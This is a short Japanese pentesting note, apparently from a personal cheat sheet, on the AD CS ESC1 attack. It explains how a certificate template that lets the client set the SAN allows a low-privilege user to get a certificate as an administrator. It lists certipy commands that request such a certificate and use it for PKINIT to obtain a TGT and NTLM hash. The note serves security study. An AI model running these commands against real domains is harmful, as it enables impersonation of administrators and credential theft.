---
title: ESC1（証明書テンプレートでクライアントが SAN を自由に設定できる）
date: 2026-10-17
category: Active Directory
topic: AD CS
tags: [active-directory, adcs, esc1, certipy]
summary: 証明書テンプレートがクライアント側の SAN 指定を許可している場合、任意ユーザー（管理者含む）になりすます証明書を発行させられる
---

## 概要

ESC1 は AD CS（Active Directory Certificate Services）の証明書テンプレートに起因する権限昇格手法のひとつ。証明書テンプレートの設定で、クライアントが証明書要求時に SAN（Subject Alternative Name）を自由に指定できるようになっていると、要求者は自分のアカウントとは無関係に「管理者の UPN」などを SAN に指定した証明書を発行させられる。

発行された証明書はクライアント認証に使えるため、これを使って Kerberos 認証（PKINIT）すると、SAN に指定したユーザー（＝管理者）としての TGT や NTLM ハッシュを取得できてしまう。

成立条件は主に次の 3 つ。

- テンプレートがクライアント側の SAN 指定を許可している
- テンプレートが「クライアント認証」の EKU（拡張キー使用法）を持つ
- 低権限ユーザーにそのテンプレートへの登録権限がある

## 手順

1. 列挙可能な証明書テンプレートの中から、SAN をクライアントが指定できる脆弱なテンプレートを見つける。
2. そのテンプレートに対して、SAN に管理者の UPN を指定した証明書要求を送る。
3. 発行された証明書（`.pfx`）を使って PKINIT 認証を行い、TGT と NTLM ハッシュを取得する。

## コマンド

```
# 管理者の SAN を指定して証明書を要求
certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' \
  -target <CA_HOST> -template 'VulnTemplate' -upn administrator@lab.local

# 得た証明書で認証し、TGT と NTLM ハッシュを取得
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## 注意点

- ESC1〜ESC8 の中でも最もシンプルで悪用しやすいパターンのひとつ。
